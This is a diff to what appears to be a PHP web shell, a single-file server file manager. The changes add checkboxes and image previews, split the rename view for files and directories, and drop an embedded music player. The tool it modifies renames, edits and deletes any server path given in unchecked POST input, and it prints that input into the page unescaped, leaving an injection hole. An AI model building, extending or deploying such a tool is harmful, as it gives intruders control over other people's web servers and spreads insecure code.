@@ -134,8 +134,8 @@ tbody td:last-child, thead th:last-child {
   	background: transparent; 
 }
 .icon {
-  width:25px;
-  height:25px;
+  max-width:25px;
+  max-height:25px;
   margin-bottom:-5px;
   margin-right:7px;
 }
@@ -242,6 +242,9 @@ button:hover {
 	.right {
 		float: right;
 	}
+	.punten {
+		width:96.5%;
+	}
 
 }
 </style>
@@ -328,7 +331,7 @@ function permission($filename, $perms, $po=false) {
 }
 function alert($msg, $type) {
 	?>
-	<div class="alert <?=$type?>"><?= $msg ?></div>
+	<div class="alert punten <?=$type?>"><?= $msg ?></div>
 	<?php
 }
 function size($file) {
@@ -482,7 +485,7 @@ switch (@$_POST['action']) {
 	case 'rename':
 		if (isset($_POST['submit'])) {
 			if (rename($_POST['file'], $_POST['newname'])) {
-				header("Location: ?dir=".cwd()."");
+				?> <script>window.location='?dir=<?=cwd()?>'</script> <?php
 			} else {
 				?>
 				<tr>
@@ -493,44 +496,92 @@ switch (@$_POST['action']) {
 				<?php
 			}
 		}
-		?>
-			<tr>
-				<td class="action">
-					Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
-				</td>
-				<td class="action">
-					Size : <?= size($_POST['file']) ?>
-				</td>
-				<td class="action">
-					Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
-				</td>
-				<form method="post">
-				<td class="action">
-					<select class="action act fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
-						<option value="back">back</option>
-						<option value="edit">Edit</option>
-						<option value="delete">delete</option>
-						<option value="rename" selected>rename</option>
-					</select>
-					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-				</td>
-			</tr>
-			</form>
-			<form method="post">
-			<tr>
-				<td class="action">
-					<input class="rename" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
-				</td>
-			</tr>
-			<tr>
-				<td class="action">
-					<input class="rename" type="submit" name="submit" value="RENAME">
-					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-					<input type="hidden" name="action" value="rename">
-				</td>
-			</tr>
-		</form>
-		<?php
+		switch ($_POST['file']) {
+			case @filetype($_POST['file']) == 'dir':
+				if (is_dir($_POST['file'])) {
+					?>
+					<tr>
+						<td class="action">
+							Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
+						</td>
+						<td class="action">
+							Size : <?= size($_POST['file']) ?>
+						</td>
+						<td class="action">
+							Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
+						</td>
+						<form method="post">
+						<td class="action">
+							<select class="action act fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+									<option value="back">back</option>
+									<option value="delete">delete</option>
+									<option value="rename" selected>rename</option>
+							</select>
+							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+						</td>
+					</tr>
+					</form>
+					<form method="post">
+					<tr>
+						<td class="action">
+							<input class="rename" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+						</td>
+					</tr>
+					<tr>
+						<td class="action">
+							<input class="rename" type="submit" name="submit" value="RENAME">
+							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+							<input type="hidden" name="action" value="rename">
+						</td>
+					</tr>
+				</form>
+				<?php
+				}
+				break;
+			
+			case @filetype($_POST['file']) == 'file':
+				if (is_file($_POST['file'])) {
+					?>
+					<tr>
+						<td class="action">
+							Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
+						</td>
+						<td class="action">
+							Size : <?= size($_POST['file']) ?>
+						</td>
+						<td class="action">
+							Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
+						</td>
+						<form method="post">
+						<td class="action">
+							<select class="action act fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+								<option value="back">back</option>
+								<option value="edit">edit</option>
+								<option value="delete">delete</option>
+								<option value="rename" selected>rename</option>
+							</select>
+								<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+						</td>
+					</tr>
+					</form>
+					<form method="post">
+					<tr>
+						<td class="action">
+							<input class="rename" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+						</td>
+					</tr>
+					<tr>
+						<td class="action">
+							<input class="rename" type="submit" name="submit" value="RENAME">
+							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+							<input type="hidden" name="action" value="rename">
+						</td>
+					</tr>
+				</form>
+				<?php
+				}
+				break;
+			}
 		exit();
 		break;
 	case 'back':
@@ -549,11 +600,11 @@ if(function_exists('opendir')) {
 foreach ($getpath as $dir) {
 	if (!is_dir($dir) || $dir === '.') continue;
 		if ($dir === '..') {
-			$back = "<a href='?dir=".dirname(cwd())."'>
+			$back = "<input type='checkbox'>&nbsp&nbsp<a href='?dir=".dirname(cwd())."'>
 					 <img class='icon' src='https://image.flaticon.com/icons/svg/833/833385.svg' title='back'>
 					 </a>";
 		} else {
-			$back = "<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='{$dir}'>&nbsp&nbsp<a href='?dir=".cwd().'/'.$dir."'>{$dir}</a>";
+			$back = "<input type='checkbox'>&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='{$dir}'>&nbsp&nbsp<a href='?dir=".cwd().'/'.$dir."'>{$dir}</a>";
 		} if ($dir === '.' || $dir === '..') {
 			$action = "<td class='dir'></td>";
 		} else {
@@ -591,6 +642,7 @@ foreach ($getpath as $file) {
 		?>
 		<tr class="hover">
 			<td class="td">
+				<input type='checkbox'>
 				<?php
 				print("<img class='icon' src='");
 				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
@@ -611,7 +663,7 @@ foreach ($getpath as $file) {
 						print("https://image.flaticon.com/icons/svg/136/136531.svg");
 						break;
 					case 'png':
-						print("https://image.flaticon.com/icons/png/128/136/136523.png");
+						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
 						break;
 					case 'html':
 						print("https://image.flaticon.com/icons/png/128/136/136528.png");
@@ -623,10 +675,13 @@ foreach ($getpath as $file) {
 						print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
 						break;
 					case 'jpg':
-						print("https://image.flaticon.com/icons/png/128/136/136524.png");
+						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
 						break;
 					case 'jpeg':
-						print("https://image.flaticon.com/icons/svg/2306/2306114.svg");
+						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
+						break;
+					case 'gif':
+						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
 						break;
 					case 'pdf':
 						print("https://image.flaticon.com/icons/png/128/136/136522.png");
@@ -662,9 +717,9 @@ foreach ($getpath as $file) {
 						print("https://image.flaticon.com/icons/svg/833/833524.svg");
 				 		break;
 				}
-				 	print("' title='{$file}'> ");
+				 	print("' title='{$file}'>");
 				$href = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file));
-				?> 
+				?>
 				 <a href="<?= $href ?>" target='_blank'><?= $file ?></a>
 			</td>
 			<td class="screen">
@@ -696,27 +751,14 @@ foreach ($getpath as $file) {
 	}
 }
 ?>
+<tr>
+	<td class="action">
+		<select class="action" style="float:left;width:50%;" onchange='if(this.value != 0) { this.form.submit(); }'>
+			<option selected="">choose . .</option>
+		</select>
+	</td>
+</tr>
+<?php
+?>
 </tbody>
 </table>
-<script type="text/javascript" src="https://www.scmplayer.net/script.js" 
-data-config="{
-'skin':'skins/black/skin.css',
-'volume':100,
-'autoplay':false,
-'shuffle':true,
-'repeat':1,
-'placement':'bottom',
-'showplaylist':false,
-'playlist':[{'title':'Fly me to the moon',
-'url':'https://soundcloud.com/teddy-ar-679549927/love-lyrics-fly-me-to-the-moon'},
-{'title':'Felix Official - DEAR GOD A7x [ LYRIC ] FELIX IR',
-'url':'https://soundcloud.com/teddy-ar-679549927/felix-official-when-we-were'},
-{'title':'Jericson - Can_t Take My Eyes Off You (Aiivawn)',
-'url':'https://soundcloud.com/teddy-ar-679549927/jericson-can_t-take-my-eyes'},
-{'title':'Felix Official - WHEN WE WERE YOUNG ADELE',
-'url':'https://soundcloud.com/teddy-ar-679549927/felix-official-when-we-were'},
-{'title':'Aoi - Untukmu',
-'url':'https://soundcloud.com/teddy-ar-679549927/aoi-untukmu-reupload'},
-{'title':'Aoi - I Still Loving You',
-'url':'https://soundcloud.com/herkisa-jr/aoi-i-still-loving-you'}]}" ></script>
-
